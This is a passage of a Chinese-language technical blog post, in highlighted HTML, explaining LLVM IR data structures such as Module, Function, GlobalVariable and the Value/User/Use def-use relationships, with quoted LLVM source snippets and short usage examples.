&amp;func : <span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">functions</span>());<br></code></pre></td></tr></table></figure></li><li><p>Global Variable</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/// @&#125;</span><br><span class="hljs-comment">/// @name Global Variable Iteration</span><br><span class="hljs-comment">/// @&#123;</span><br><br>  <span class="hljs-function">global_iterator       <span class="hljs-title">global_begin</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> GlobalList.<span class="hljs-built_in">begin</span>(); &#125;<br>  <span class="hljs-function">const_global_iterator <span class="hljs-title">global_begin</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> GlobalList.<span class="hljs-built_in">begin</span>(); &#125;<br>  <span class="hljs-function">global_iterator       <span class="hljs-title">global_end</span>  <span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> GlobalList.<span class="hljs-built_in">end</span>(); &#125;<br>  <span class="hljs-function">const_global_iterator <span class="hljs-title">global_end</span>  <span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> GlobalList.<span class="hljs-built_in">end</span>(); &#125;<br>  <span class="hljs-function"><span class="hljs-type">size_t</span>                <span class="hljs-title">global_size</span> <span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> GlobalList.<span class="hljs-built_in">size</span>(); &#125;<br>  <span class="hljs-function"><span class="hljs-type">bool</span>                  <span class="hljs-title">global_empty</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> GlobalList.<span class="hljs-built_in">empty</span>(); &#125;<br><br>  <span class="hljs-function">iterator_range&lt;global_iterator&gt; <span class="hljs-title">globals</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_range</span>(<span class="hljs-built_in">global_begin</span>(), <span class="hljs-built_in">global_end</span>());<br>  &#125;<br>  <span class="hljs-function">iterator_range&lt;const_global_iterator&gt; <span class="hljs-title">globals</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_range</span>(<span class="hljs-built_in">global_begin</span>(), <span class="hljs-built_in">global_end</span>());<br>  &#125;<br></code></pre></td></tr></table></figure><p>🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Module *<span class="hljs-keyword">module</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> &amp;var : <span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">globals</span>());<br></code></pre></td></tr></table></figure></li></ul><h2 id="获取列表"><a href="#获取列表" class="headerlink" title="获取列表"></a>获取列表</h2><ul><li><p>Function</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/// Get the Module&#x27;s list of functions (constant).</span><br><span class="hljs-function"><span class="hljs-type">const</span> FunctionListType &amp;<span class="hljs-title">getFunctionList</span><span class="hljs-params">()</span> <span class="hljs-type">const</span>     </span>&#123; <span class="hljs-keyword">return</span> FunctionList; &#125;<br><span class="hljs-comment">/// Get the Module&#x27;s list of functions.</span><br><span class="hljs-function">FunctionListType       &amp;<span class="hljs-title">getFunctionList</span><span class="hljs-params">()</span>           </span>&#123; <span class="hljs-keyword">return</span> FunctionList; &#125;<br></code></pre></td></tr></table></figure></li><li><p>Global Variable</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/// Get the Module&#x27;s list of global variables (constant).</span><br><span class="hljs-function"><span class="hljs-type">const</span> GlobalListType   &amp;<span class="hljs-title">getGlobalList</span><span class="hljs-params">()</span> <span class="hljs-type">const</span>       </span>&#123; <span class="hljs-keyword">return</span> GlobalList; &#125;<br><span class="hljs-comment">/// Get the Module&#x27;s list of global variables.</span><br><span class="hljs-function">GlobalListType         &amp;<span class="hljs-title">getGlobalList</span><span class="hljs-params">()</span>             </span>&#123; <span class="hljs-keyword">return</span> GlobalList; &#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="函数操作"><a href="#函数操作" class="headerlink" title="函数操作"></a>函数操作</h2><p>查找函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">Function *<span class="hljs-title">getFunction</span><span class="hljs-params">(StringRef Name)</span> <span class="hljs-type">const</span></span>;<br></code></pre></td></tr></table></figure><p>🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Module *<span class="hljs-keyword">module</span>;<br>Function *pmain = <span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getFunction</span>(<span class="hljs-string">&quot;main&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="查找Or插入函数"><a href="#查找Or插入函数" class="headerlink" title="查找Or插入函数"></a>查找Or插入函数</h3><p>Module中提供了一系列插入or查找Function的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">FunctionCallee <span class="hljs-title">getOrInsertFunction</span><span class="hljs-params">(StringRef Name, FunctionType *T,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     AttributeList AttributeList)</span></span>;<br><span class="hljs-function">FunctionCallee <span class="hljs-title">getOrInsertFunction</span><span class="hljs-params">(StringRef Name, FunctionType *T)</span></span>;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span>... ArgsTy&gt;<br><span class="hljs-function">FunctionCallee <span class="hljs-title">getOrInsertFunction</span><span class="hljs-params">(StringRef Name,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     AttributeList AttributeList, Type *RetTy,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     ArgsTy... Args)</span></span>;<br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span>... ArgsTy&gt;<br><span class="hljs-function">FunctionCallee <span class="hljs-title">getOrInsertFunction</span><span class="hljs-params">(StringRef Name, Type *RetTy,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     ArgsTy... Args)</span></span>;<br></code></pre></td></tr></table></figure><p>需要</p><ul><li><p>StringRef Name：函数名</p></li><li><p>Type *RetTy：返回值类型</p><p>Type类型提供了构造各种类型的静态函数，只需要提供Module的Context</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getVoidTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getLabelTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getHalfTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getBFloatTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getFloatTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getDoubleTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getMetadataTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getX86_FP80Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getFP128Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getPPC_FP128Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getX86_MMXTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getX86_AMXTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> Type *<span class="hljs-title">getTokenTy</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> IntegerType *<span class="hljs-title">getIntNTy</span><span class="hljs-params">(LLVMContext &amp;C, <span class="hljs-type">unsigned</span> N)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> IntegerType *<span class="hljs-title">getInt1Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> IntegerType *<span class="hljs-title">getInt8Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> IntegerType *<span class="hljs-title">getInt16Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> IntegerType *<span class="hljs-title">getInt32Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> IntegerType *<span class="hljs-title">getInt64Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br><span class="hljs-function"><span class="hljs-type">static</span> IntegerType *<span class="hljs-title">getInt128Ty</span><span class="hljs-params">(LLVMContext &amp;C)</span></span>;<br></code></pre></td></tr></table></figure><p>🌰，记得命名空间</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>())<br></code></pre></td></tr></table></figure></li><li><p>ArgsTy… Args：每个参数的类型</p></li><li><p>FunctionType *T：函数类型（其实就是参数类型和返回值类型的集合），可以通过get方法构造</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionType</span> : <span class="hljs-keyword">public</span> Type &#123;<br>  <span class="hljs-function"><span class="hljs-type">static</span> FunctionType *<span class="hljs-title">get</span><span class="hljs-params">(Type *Result,</span></span><br><span class="hljs-params"><span class="hljs-function">                           ArrayRef&lt;Type*&gt; Params, <span class="hljs-type">bool</span> isVarArg)</span></span>;<br></code></pre></td></tr></table></figure><p>🌰，isVarArg是是否支持可变参数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">FunctionType *funcTy = FunctionType::<span class="hljs-built_in">get</span>(ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>()), &#123;ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>()), ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>())&#125;, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure></li><li><p>AttributeList AttributeList：先忽略（</p></li></ul><p>🌰🌰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">FunctionType *funcTy = FunctionType::<span class="hljs-built_in">get</span>(ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>()), &#123;ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>()), ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>())&#125;, <span class="hljs-literal">false</span>);<br>FunctionCallee callee = <span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getOrInsertFunction</span>(<span class="hljs-string">&quot;myadd&quot;</span>, funcTy);<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">FunctionCallee callee = <span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getOrInsertFunction</span>(<span class="hljs-string">&quot;myadd&quot;</span>, ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>()), ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>()),ArrayType::<span class="hljs-built_in">getInt32Ty</span>(<span class="hljs-keyword">module</span>-&gt;<span class="hljs-built_in">getContext</span>()));<br></code></pre></td></tr></table></figure><p>返回值类型是FunctionCallee，成员为一个Value指针和一个FunctionType指针</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionCallee</span> &#123;<br><br><span class="hljs-keyword">private</span>:<br>  FunctionType *FnTy = <span class="hljs-literal">nullptr</span>;<br>  Value *Callee = <span class="hljs-literal">nullptr</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>可以通过public方法获取这两个成员</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">FunctionType *<span class="hljs-title">getFunctionType</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> FnTy; &#125;<br><span class="hljs-function">Value *<span class="hljs-title">getCallee</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> Callee; &#125;<br></code></pre></td></tr></table></figure><p>这个Value指针实际上就是指向构造的Function，从getOrInsertFunction源码可以看出来</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">FunctionCallee <span class="hljs-title">Module::getOrInsertFunction</span><span class="hljs-params">(StringRef Name, FunctionType *Ty,</span></span><br><span class="hljs-params"><span class="hljs-function">                                           AttributeList AttributeList)</span> </span>&#123;<br>  <span class="hljs-comment">// See if we have a definition for the specified function already.</span><br>  GlobalValue *F = <span class="hljs-built_in">getNamedValue</span>(Name);<br>  <span class="hljs-keyword">if</span> (!F) &#123;<br>    <span class="hljs-comment">// Nope, add it</span><br>    Function *New = Function::<span class="hljs-built_in">Create</span>(Ty, GlobalVariable::ExternalLinkage,<br>                                     DL.<span class="hljs-built_in">getProgramAddressSpace</span>(), Name);<br>    <span class="hljs-keyword">if</span> (!New-&gt;<span class="hljs-built_in">isIntrinsic</span>())       <span class="hljs-comment">// Intrinsics get attrs set on construction</span><br>      New-&gt;<span class="hljs-built_in">setAttributes</span>(AttributeList);<br>    FunctionList.<span class="hljs-built_in">push_back</span>(New);<br>    <span class="hljs-keyword">return</span> &#123;Ty, New&#125;; <span class="hljs-comment">// Return the new prototype.</span><br>  &#125;<br></code></pre></td></tr></table></figure><p>使用的时候需要类型转换</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Function *customFunc = <span class="hljs-built_in">dyn_cast</span>&lt;Function&gt;(callee.<span class="hljs-built_in">getCallee</span>());<br></code></pre></td></tr></table></figure><h1 id="Value，User和Use"><a href="#Value，User和Use" class="headerlink" title="Value，User和Use"></a>Value，User和Use</h1><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/def-use.png" class title="def-use"><p>一个形如<code>%1 = add i32 %2, %3</code>这里这个Instruction就是User（Value的使用者），%2、%3就是被使用的Value，Use就是这个使用的行为，在数据结构中体现为两点（User和Value）之间的一条边</p><h2 id="Value"><a href="#Value" class="headerlink" title="Value"></a>Value</h2><p>Value类中有一个UseList成员</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Value</span> &#123;<br>  Use *UseList;<br></code></pre></td></tr></table></figure><p>指向第一个Use</p><h2 id="Use"><a href="#Use" class="headerlink" title="Use"></a>Use</h2><p>一个Value被使用的所有Use以链表的形式连在一起</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Use</span> &#123;<br><span class="hljs-keyword">private</span>:<br>  Value *Val = <span class="hljs-literal">nullptr</span>;<br>  Use *Next = <span class="hljs-literal">nullptr</span>;<br>  Use **Prev = <span class="hljs-literal">nullptr</span>;<br>  User *Parent = <span class="hljs-literal">nullptr</span>;<br></code></pre></td></tr></table></figure><ul><li>Val：指向被使用的Value</li><li>Next：指向下一个Use</li><li>Prev：指向上一个Prev</li><li>Parent：指向User</li></ul><h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><p>Use会放在User结构体前，如上图所示👆</p><p>Use结构体有两种放置方式</p><ul><li><p>固定个数的Use，以数组的形式放在User前</p><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/use1.png" class title="use1"></li><li><p>不定个数的Use，一个Use放在User前，这个Use的Prev指针指向Use数组</p><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/use2.png" class title="use2"></li></ul><p>这点可以通过getOperandList函数看出来</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// HasHungOffUses是Value的成员  </span><br><br><span class="hljs-function"><span class="hljs-type">const</span> Use *<span class="hljs-title">getOperandList</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> HasHungOffUses ? <span class="hljs-built_in">getHungOffOperands</span>() : <span class="hljs-built_in">getIntrusiveOperands</span>();<br>  &#125;<br><br><span class="hljs-function"><span class="hljs-type">const</span> Use *<span class="hljs-title">getHungOffOperands</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> Use *<span class="hljs-type">const</span> *&gt;(<span class="hljs-keyword">this</span>) - <span class="hljs-number">1</span>);<br>  &#125;<br><span class="hljs-function"><span class="hljs-type">const</span> Use *<span class="hljs-title">getIntrusiveOperands</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> Use *&gt;(<span class="hljs-keyword">this</span>) - NumUserOperands;<br>  &#125;<br></code></pre></td></tr></table></figure><p>当HasHungOffUses为0时，Use的Prev指向前一个Use的Next，由于Prev是Use**类型所以其实还是指向自己（</p><h1 id="GlobalVariable"><a href="#GlobalVariable" class="headerlink" title="GlobalVariable"></a>GlobalVariable</h1><p>储存全局变量相关信息</p><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/GlobalVariable.png" class title="GlobalVariable"><h2 id="相关操作"><a href="#相关操作" class="headerlink" title="相关操作"></a>相关操作</h2><ul><li><p>创建一个GlobalVariable</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">GlobalVariable</span>(Type *Ty, <span class="hljs-type">bool</span> isConstant, LinkageTypes Linkage,<br>               Constant *Initializer = <span class="hljs-literal">nullptr</span>, <span class="hljs-type">const</span> Twine &amp;Name = <span class="hljs-string">&quot;&quot;</span>,<br>               ThreadLocalMode = NotThreadLocal, <span class="hljs-type">unsigned</span> AddressSpace = <span class="hljs-number">0</span>,<br>               <span class="hljs-type">bool</span> isExternallyInitialized = <span class="hljs-literal">false</span>);<br>  <br><span class="hljs-built_in">GlobalVariable</span>(Module &amp;M, Type *Ty, <span class="hljs-type">bool</span> isConstant, LinkageTypes Linkage,<br>               Constant *Initializer, <span class="hljs-type">const</span> Twine &amp;Name = <span class="hljs-string">&quot;&quot;</span>,<br>               GlobalVariable *InsertBefore = <span class="hljs-literal">nullptr</span>,<br>               ThreadLocalMode = NotThreadLocal,<br>               Optional&lt;<span class="hljs-type">unsigned</span>&gt; AddressSpace = None,<br>               <span class="hljs-type">bool</span> isExternallyInitialized = <span class="hljs-literal">false</span>);<br>  <br><span class="hljs-built_in">GlobalVariable</span>(<span class="hljs-type">const</span> GlobalVariable &amp;) = <span class="hljs-keyword">delete</span>;<br>GlobalVariable &amp;<span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> GlobalVariable &amp;) = <span class="hljs-keyword">delete</span>;<br></code></pre></td></tr></table></figure></li><li><p>判断是否能在运行时修改</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isConstant</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br></code></pre></td></tr></table></figure></li></ul><h1 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h1><p>主要成员有</p><ul><li>一个Arguments指针，指向Argument数组</li><li>一个BasicBlock双链表</li></ul><img src="/2023/10/02/LLVM-IR%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/Function.png" class title="Function"><h2 id="相关操作-1"><a href="#相关操作-1" class="headerlink" title="相关操作"></a>相关操作</h2><ul><li><p>迭代器，相关操作同Module</p><ul><li><p>BasicBlock迭代器</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//===--------------------------------------------------------------------===//</span><br><span class="hljs-comment">// BasicBlock iterator forwarding functions</span><br><span class="hljs-comment">//</span><br><span class="hljs-function">iterator                <span class="hljs-title">begin</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">begin</span>(); &#125;<br><span class="hljs-function">const_iterator          <span class="hljs-title">begin</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">begin</span>(); &#125;<br><span class="hljs-function">iterator                <span class="hljs-title">end</span>  <span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">end</span>();   &#125;<br><span class="hljs-function">const_iterator          <span class="hljs-title">end</span>  <span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">end</span>();   &#125;<br>    <br><span class="hljs-function"><span class="hljs-type">size_t</span>                   <span class="hljs-title">size</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">size</span>();  &#125;<br><span class="hljs-function"><span class="hljs-type">bool</span>                    <span class="hljs-title">empty</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">empty</span>(); &#125;<br><span class="hljs-function"><span class="hljs-type">const</span> BasicBlock       &amp;<span class="hljs-title">front</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">front</span>(); &#125;<br>      <span class="hljs-function">BasicBlock       &amp;<span class="hljs-title">front</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">front</span>(); &#125;<br><span class="hljs-function"><span class="hljs-type">const</span> BasicBlock        &amp;<span class="hljs-title">back</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">back</span>();  &#125;<br>      <span class="hljs-function">BasicBlock        &amp;<span class="hljs-title">back</span><span class="hljs-params">()</span>       </span>&#123; <span class="hljs-keyword">return</span> BasicBlocks.<span class="hljs-built_in">back</span>();  &#125;<br></code></pre></td></tr></table></figure></li><li><p>Argument迭代器</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">arg_iterator <span class="hljs-title">arg_begin</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-built_in">CheckLazyArguments</span>();<br>  <span class="hljs-keyword">return</span> Arguments;<br>&#125;<br><span class="hljs-function">const_arg_iterator <span class="hljs-title">arg_begin</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-built_in">CheckLazyArguments</span>();<br>  <span class="hljs-keyword">return</span> Arguments;<br>&#125;<br>    <br><span class="hljs-function">arg_iterator <span class="hljs-title">arg_end</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-built_in">CheckLazyArguments</span>();<br>  <span class="hljs-keyword">return</span> Arguments + NumArgs;<br>&#125;<br><span class="hljs-function">const_arg_iterator <span class="hljs-title">arg_end</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123;<br>  <span class="hljs-built_in">CheckLazyArguments</span>();<br>  <span class="hljs-keyword">return</span> Arguments + NumArgs;<br>&#125;<br>    <br><span class="hljs-function">Argument* <span 